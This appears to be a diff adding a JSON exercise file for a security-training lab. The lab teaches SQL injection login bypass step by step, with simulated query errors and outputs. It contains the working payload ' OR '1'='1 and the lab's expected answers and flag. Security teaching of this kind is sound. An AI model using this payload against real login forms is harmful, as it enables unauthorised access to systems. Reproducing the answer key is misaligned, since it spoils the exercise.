@@ -1,0 +1,54 @@
+{
+  "id": "lab_sql_injection",
+  "title": "SQL Injection Fundamentals",
+  "description": "Master the basics of SQL injection attacks. Learn to identify and exploit vulnerable login forms.",
+  "difficulty": "Intermediate",
+  "duration": "20 min",
+  "category": "Web Security",
+  "semester_level": 4,
+  "scenario": "You've discovered a vulnerable admin login page during a security assessment. Your task is to bypass the authentication mechanism using SQL injection techniques.",
+  "environment": "web_form",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Identify the Vulnerability",
+      "instruction": "Try entering a single quote (') in the username field to test if the application is vulnerable to SQL injection.",
+      "hint": "A single quote can break SQL syntax and reveal errors",
+      "expected_input": "'",
+      "input_field": "username",
+      "output": "Error: SQL syntax error near ''' at line 1\nQuery: SELECT * FROM users WHERE username=''' AND password=''",
+      "explanation": "The error message reveals the underlying SQL query structure. The application is vulnerable because user input is directly concatenated into the SQL query."
+    },
+    {
+      "step": 2,
+      "title": "Understand the Query",
+      "instruction": "Analyze the revealed query structure. The login query checks both username AND password. We need to make this always return true.",
+      "hint": "Think about how to make the WHERE clause always evaluate to true",
+      "expected_input": "understood",
+      "input_field": "confirm",
+      "output": "Query structure: SELECT * FROM users WHERE username='[input]' AND password='[input]'\n\nTo bypass: We need to inject code that makes the condition always TRUE",
+      "explanation": "The query uses AND logic. If we can make the entire WHERE clause true, we'll get access."
+    },
+    {
+      "step": 3,
+      "title": "Craft the Payload",
+      "instruction": "Enter the classic SQL injection payload to bypass authentication. Use: ' OR '1'='1",
+      "hint": "This payload closes the username string and adds an OR condition that's always true",
+      "expected_input": "' OR '1'='1",
+      "input_field": "username",
+      "output": "Query executed: SELECT * FROM users WHERE username='' OR '1'='1' AND password=''\n\n[!] Authentication logic being evaluated...\n[+] OR condition detected\n[+] '1'='1' evaluates to TRUE\n[+] Bypass successful!",
+      "explanation": "The payload works because '1'='1' is always true, making the OR condition pass regardless of the actual username/password."
+    },
+    {
+      "step": 4,
+      "title": "Complete the Attack",
+      "instruction": "Now enter the same payload in the password field and submit to gain admin access.",
+      "hint": "Use the same payload for both fields",
+      "expected_input": "' OR '1'='1",
+      "input_field": "password",
+      "output": "╔══════════════════════════════════════╗\n║   ACCESS GRANTED: Welcome Admin!     ║\n║                                      ║\n║   FLAG{ISC_SQL_INJECTION_PRO_2024}   ║\n╚══════════════════════════════════════╝",
+      "explanation": "Congratulations! You've successfully bypassed authentication using SQL injection. In real scenarios, this vulnerability could lead to complete database compromise.",
+      "flag": "FLAG{ISC_SQL_INJECTION_PRO_2024}"
+    }
+  ]
+}
